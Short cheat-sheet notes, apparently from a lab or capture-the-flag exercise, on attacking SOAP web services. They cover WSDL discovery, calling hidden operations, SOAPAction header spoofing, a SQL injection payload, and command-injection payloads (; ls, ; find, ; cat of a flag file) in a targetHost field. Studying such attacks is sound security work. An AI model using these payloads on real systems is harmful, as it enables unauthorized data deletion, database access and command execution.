Use google to find the wsdl file

    site:www.vuln.att filetype:wsdl

or you can use the **"?wsdl | .wsdl | ?disco"** at the end of the url

# Example

An application contains three operations and requires Student ID:

- **studentInfo** 
- **studentExam**
- **studentBilling**

But if we request the **wsdl** file we can notice some hidden operations like :

- **deleteStudent**
- **getAdminInfo**

So if there are no restrictions then we can change the **studentInfo** operation to **deleteStudent**.

    <SOAP-ENV:deleteStudent>
        <id>8</id>
    </SOAP-ENV:deleteStudent>

<br/>

# Spoof a SOAP action header

The header soap action is set to **getStudentInfo**

    SOAPAction: "http://www.vuln.att.com/getStudentInfo"

A remote attacker can invoke the method **deleteAllStudents**  by changing the soap header

    SOAPAction: "http://www.vuln.att.com/deleteAllStudents"

<br/>

# SQLi through SOAP


    <SOAP-ENV:getStudentInfo>
        <id> ' or '1'='1 </id>
    </SOAP-ENV:getStudentInfo>


# Lab example
### Bypass the SOAP body restrictions using the SOAPAction header.

<br/>

Add the header :

    SOAPAction: urn:ws-user-account#getAdminInfo

If the request is restricted to only admins, look for the soap action header related to the admin operation.

<br/>

# Command Execution

    <targetHost>
     ; ls
    </targetHost>

<br/>

    <targetHost>
     ; find / -iname *flag* 2>/dev/null
    </targetHost>

**iname** matches names but case insensitive.
**2>/dev/null** to not print out errors.


<br/>

    <targetHost>
     ; cat /app/flag3
    </targetHost>